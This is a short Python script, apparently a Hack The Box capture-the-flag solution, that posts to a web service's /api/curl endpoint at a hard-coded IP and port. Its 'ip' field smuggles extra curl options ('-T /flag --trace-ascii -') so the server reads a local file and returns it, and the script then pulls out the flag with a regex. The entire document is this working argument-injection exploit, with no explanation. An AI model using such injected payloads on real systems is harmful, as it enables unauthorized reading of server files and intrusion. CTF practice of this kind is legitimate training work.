import requests
import re

host, port = "83.136.252.14", 32145

url = f"http://{host}:{port}"

curl_url = f"{url}/api/curl"

data = {
    "ip":"127.0.0.1 -T /flag -vv --trace-ascii -"
}

response = requests.post(curl_url, data=data)

flag = re.search(r'HTB\{.*?\}', response.text)

print(flag.group())